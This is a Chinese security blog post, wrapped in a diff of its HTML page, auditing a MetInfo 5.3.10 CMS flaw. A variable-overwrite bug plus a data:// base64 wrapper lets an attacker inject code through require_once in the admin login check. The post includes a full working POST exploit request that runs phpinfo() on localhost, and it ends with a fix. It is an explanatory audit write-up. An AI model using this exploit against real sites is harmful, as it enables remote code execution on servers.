@@ -1,0 +1,702 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>Metinfo5.3.10 CMS 命令执行 文件包含 | Hello_C技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="Hello_C">
+    
+
+    
+    <meta name="description" content="0x00 MetInfoMetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。
+0x01 命令执行 文件包含命令执行：应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metinfo5.3.10 CMS 命令执行 文件包含">
+<meta property="og:url" content="http://yoursite.com/审计/2016/11/27/Metinfo5-3-10-CMS-命令执行-文件包含.html">
+<meta property="og:site_name" content="Hello_C技术博客">
+<meta property="og:description" content="0x00 MetInfoMetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。
+0x01 命令执行 文件包含命令执行：应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统">
+<meta property="og:image" content="http://i1.piimg.com/567571/d5b5e87512c79439.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/4b634cadfa654e5f.png">
+<meta property="og:image" content="http://p1.bpimg.com/567571/029868dcb218554d.png">
+<meta property="og:updated_time" content="2017-04-02T07:29:43.674Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metinfo5.3.10 CMS 命令执行 文件包含">
+<meta name="twitter:description" content="0x00 MetInfoMetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。
+0x01 命令执行 文件包含命令执行：应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统">
+<meta name="twitter:image" content="http://i1.piimg.com/567571/d5b5e87512c79439.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Hello_C技术博客" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.jpg" alt="Hello_C技术博客" title="Hello_C技术博客"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Hello_C技术博客">Hello_C技术博客</a></h1>
+				<h2 class="blog-motto">一个小白的独白！</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/Message">Message</a></li>
+					
+					<li>
+ 					
+						<form class="search" action="http://baidu.com/" target="_blank">
+							<label>Search</label>
+						<input name="s" type="hidden" value= null ><input type="text" name="q" size="30" placeholder="搜索"><br>
+						</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/审计/2016/11/27/Metinfo5-3-10-CMS-命令执行-文件包含.html" title="Metinfo5.3.10 CMS 命令执行 文件包含" itemprop="url">Metinfo5.3.10 CMS 命令执行 文件包含</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="Hello_C" target="_blank" itemprop="author">Hello_C</a>
+		
+  <p class="article-time">
+    <time datetime="2016-11-27T14:55:21.000Z" itemprop="datePublished"> 发表于 2016-11-27</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-MetInfo"><span class="toc-number">1.</span> <span class="toc-text">0x00 MetInfo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-命令执行-文件包含"><span class="toc-number">2.</span> <span class="toc-text">0x01 命令执行 文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04、漏洞修复"><span class="toc-number">5.</span> <span class="toc-text">0x04、漏洞修复</span></a></li></ol>
+		
+		</div>
+		
+		<h3 id="0x00-MetInfo"><a href="#0x00-MetInfo" class="headerlink" title="0x00 MetInfo"></a>0x00 MetInfo</h3><p>MetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。</p>
+<h3 id="0x01-命令执行-文件包含"><a href="#0x01-命令执行-文件包含" class="headerlink" title="0x01 命令执行 文件包含"></a>0x01 命令执行 文件包含</h3><p><strong>命令执行：</strong>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、<br>passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令<br>拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。<br><a id="more"></a><br><strong>文件包含：</strong>由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server会将特定文件当成php执行，从而导致用户可获取一定的服务器权限。</p>
+<p>此次产生漏洞的版本号为Metinfo5.3.10，源码大家可以下载。</p>
+<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>文件admin/login/login_check.php：26行</p>
+<pre><code>f($action==&quot;login&quot;){
+   $metinfo_admin_name     = $login_name;
+   $metinfo_admin_pass     = $login_pass;
+   $metinfo_admin_pass=md5($metinfo_admin_pass);
+   /*code*/
+   if($met_login_code==1){
+      require_once $depth.&apos;../include/captcha.class.php&apos;;
+      $Captcha= new  Captcha();
+      if(!$Captcha-&gt;CheckCode($code)){
+     echo(&quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;$lang_logincodeerror&apos;);location.href=&apos;login.php?langset=$langset&apos;;&lt;/script&gt;&quot;);
+     exit;
+  }
+</code></pre><p>   }</p>
+<p>登录检测的，当后台开启登录校验码的时候$met_login_code会设置为1，然后require_once 去包含校验码登录文件。只要我们控制了变量$depth就可以进行远程文件包含了。</p>
+<p>而$depth变量是在文件’admin/login/login_check.php’开头定义的。</p>
+<pre><code>error_reporting(E_ERROR | E_WARNING | E_PARSE);
+if($depth!=&apos;&apos;&amp;&amp;$depth!=&apos;../&apos;&amp;&amp;$depth!=&apos;../../&apos;){die();}
+if(!isset($depth))$depth=&apos;&apos;;
+$commonpath=$depth.&apos;include/common.inc.php&apos;;
+$commonpath=$admin_index?$commonpath:&apos;../&apos;.$commonpath;
+define(&apos;SQL_DETECT&apos;,1);
+</code></pre><p>通过第一次拼接$depth包含了include/common.inc.php，前面几步可能没什么问题，这一步也没有问题的，包含了文件common.inc.php之后，但是common.inc.php中可以通过以下代码进行变量覆盖。</p>
+<p>文件：include/common.inc.php：35</p>
+<pre><code>foreach(array(&apos;_COOKIE&apos;, &apos;_POST&apos;, &apos;_GET&apos;) as $_request) {    // 遍历数组
+
+// $$_request分别是$_COOKIE, $_POST, $_GET，对应http请求提交过来的相应数据
+    foreach($$_request as $_key =&gt; $_value) {           // 分别遍历该数据
+
+        $_key{0} != &apos;_&apos; &amp;&amp; $$_key = daddslashes($_value,0,0,1);     // 对数据中的值进行转义
+        $_M[&apos;form&apos;][$_key] = daddslashes($_value,0,0,1);
+    }
+}
+</code></pre><p>对页面提交过来的数据，包括cookie，post, get三种数据进行转义。</p>
+<p>但是此处却存在一个变量覆盖漏洞，这里我们简单本地演示一下：</p>
+<pre><code>&lt;?php
+
+$a=&apos;hello&apos;;
+foreach($_GET as $key =&gt; $value){
+$$key = $value;
+}
+print $a;
+?&gt;
+</code></pre><p><img src="http://i1.piimg.com/567571/d5b5e87512c79439.png" alt=""> </p>
+<p>当我们get提交一个a值时，它会覆盖掉以前所定义，产生变量覆盖<br><img src="http://i1.piimg.com/567571/4b634cadfa654e5f.png" alt=""></p>
+<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>我们可以利用变量覆盖漏洞覆盖掉变量$deph。</p>
+<p>本地文件包含用require_once来执行代码，但是</p>
+<pre><code>if($depth!=&apos;&apos;&amp;&amp;$depth!=&apos;../&apos;&amp;&amp;$depth!=&apos;../../&apos;){die();}
+</code></pre><p>对depth进行了过滤，我们可以使用php的封装协议data://配合require_once来进行恶意代码执行。<br>还有一个问题</p>
+<pre><code>require_once $depth.&apos;../include/captcha.class.php&apos;;
+</code></pre><p>这一串拼接在字符后面的字符串的干扰，这一段会干扰我们想要执行的代码。</p>
+<p>用base64解码正常文字会让后面这一串字符变成乱码，并且加上了单行注释符号注释掉乱码。</p>
+<p>封装器解码之后代码的样子</p>
+<p>&lt;?php phpinfo();exit();// ..þ)Üç^ýÆ©µÈZ.rV¬s.php</p>
+<p>这样我们构造exp进行测试，前提后台开启了登录验证码：</p>
+<pre><code>POST /MetInfo_5.3.10/admin/login/login_check.php?langset=cn&amp;depth=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw== HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 83
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://127.0.0.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://127.0.0.1/MetInfo_5.3.10/admin/login/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: _ga=GA1.1.1522517218.1476456267; tablepage_json=0%7Csystem%2Cnews%2Cdonews_info; ft127001=0; recordurl=%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn; re_url=http%3A%2F%2F127.0.0.1%2FMetInfo_5.3.10%2Fadmin%2F; met_capcha=1f1ezzrSrlMNL9bl5TC1%2F2CBMinv2dvD8CX74vlrMRbq
+Connection: close
+
+action=login&amp;login_name=admin&amp;login_pass=123456&amp;code=8CAA&amp;Submit=%E7%99%BB%E5%BD%95
+</code></pre><p>执行了phpinfo()<br><img src="http://p1.bpimg.com/567571/029868dcb218554d.png" alt=""></p>
+<p>因为使用了data://，所以需要php.ini 中allow_url_include ＝on</p>
+<h3 id="0x04、漏洞修复"><a href="#0x04、漏洞修复" class="headerlink" title="0x04、漏洞修复"></a>0x04、漏洞修复</h3><p>包含include/common.inc.php再次给$depth赋值，防止变量被污染</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/审计/">审计</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/php/">php</a><a href="/tags/代码审计/">代码审计</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	<div class="share-jiathis">
+	  
+<div class="jiathis_style_24x24">
+	<a class="jiathis_button_tsina"></a>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_renren"></a>
+	<a class="jiathis_button_qzone"></a>
+	<a class="jiathis_button_googleplus"></a>
+	<a class="jiathis_button_douban"></a>
+	<a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+    var jiathis_config={
+    data_track_clickback:true,
+    sm:"copy,renren,cqq",
+    pic:"",
+    summary:"",
+    
+  </script> 
+<script type="text/javascript" src="//v3.jiathis.com/code/jia.js?uid=
+" charset="utf-8"></script>      
+
+	 </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/uncategorized/2016/11/29/Tornado-Bootstrap-快速建站.html" title="Tornado+Bootstrap 快速建站">
+  <strong>上一篇：</strong><br/>
+  <span>
+  Tornado+Bootstrap 快速建站</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/渗透/2016/11/22/w3af初级.html"  title="w3af初级">
+ <strong>下一篇：</strong><br/> 
+ <span>w3af初级
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section id="comments" class="comment">
+	<div class="ds-thread" data-thread-key="审计/2016/11/27/Metinfo5-3-10-CMS-命令执行-文件包含.html" data-title="Metinfo5.3.10 CMS 命令执行 文件包含" data-url="http://yoursite.com/审计/2016/11/27/Metinfo5-3-10-CMS-命令执行-文件包含.html"></div>
+</section>
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-MetInfo"><span class="toc-number">1.</span> <span class="toc-text">0x00 MetInfo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-命令执行-文件包含"><span class="toc-number">2.</span> <span class="toc-text">0x01 命令执行 文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04、漏洞修复"><span class="toc-number">5.</span> <span class="toc-text">0x04、漏洞修复</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="github-card">
+<p class="asidetitle">Github 名片</p>
+<div class="github-card" data-github="https://github.com/zjwfc" data-width="220" data-height="119" data-theme="medium">
+<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js" ></script>
+</div>
+  </div>
+
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/代码/" title="代码">代码<sup>7</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/审计/" title="审计">审计<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/渗透/" title="渗透">渗透<sup>8</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/漏洞/" title="漏洞">漏洞<sup>7</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/生活/" title="生活">生活<sup>2</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/渗透测试/" title="渗透测试">渗透测试<sup>23</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/writeup/" title="writeup">writeup<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php/" title="php">php<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/CTF/" title="CTF">CTF<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/杂谈/" title="杂谈">杂谈<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/sql注入/" title="sql注入">sql注入<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/提权/" title="提权">提权<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/XSS/" title="XSS">XSS<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/web前端/" title="web前端">web前端<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Metasploit/" title="Metasploit">Metasploit<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Docker/" title="Docker">Docker<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ARP攻击/" title="ARP攻击">ARP攻击<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/LAMP环境搭建/" title="LAMP环境搭建">LAMP环境搭建<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://www.dropsec.xyz/" target="_blank" title="Drops团队主页">Drops团队主页</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://ctf.dropsec.xyz" target="_blank" title="Drops攻防平台">Drops攻防平台</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://fgp.dropsec.xyz" target="_blank" title="F.G.PNotes">F.G.PNotes</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://lyx.dropsec.xyz" target="_blank" title="lazy">lazy</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://byd.dropsec.xyz" target="_blank" title="Joy_nick">Joy_nick</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wkh.dropsec.xyz" target="_blank" title="X加油,未来">X加油,未来</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://jdrops.dropsec.xyz/" target="_blank" title="J_Drops">J_Drops</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://lzx.dropsec.xyz/" target="_blank" title="凡尘">凡尘</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://cq.dropsec.xyz/" target="_blank" title="qiqi">qiqi</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://yunnigu.dropsec.xyz/" target="_blank" title="云">云</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://isron.dropsec.xyz/" target="_blank" title="Isron">Isron</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://flashsec.cn/" target="_blank" title="Flash|Sec">Flash|Sec</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="hotarticles">
+  <p class="asidetitle">hot_articles</p>
+
+  <!-- ��˵�������� start -->
+  <div class="ds-top-threads" data-range="monthly" data-num-items="5"></div>
+  <!-- ��˵�������� end -->
+
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">新浪微博</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=5664757301&verifier=8450466f&dpc=1"></iframe>
+</div>
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello ,I&#39;m Hello_C. <br/>
+			This is my blog,believe it or not.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/5664757301" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/https://github.com/zjwfc" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		<a href="http://www.zhihu.com/people/https://www.zhihu.com/people/duan-zuo-yu-yun-zhi-dian/" target="_blank" class="icon-zhihu" title="知乎"></a>
+		
+		
+		
+		<a href="mailto:845352945@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2017 
+		
+		<a href="/about" target="_blank" title="Hello_C">Hello_C</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+        getSize();
+        if (myWidth >= 1024) {
+          c.click();
+        }
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"zjwfc"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1261655448'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s23.cnzz.com/z_stat.php%3Fid%3D1261655448' type='text/javascript'%3E%3C/script%3E"));</script>
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
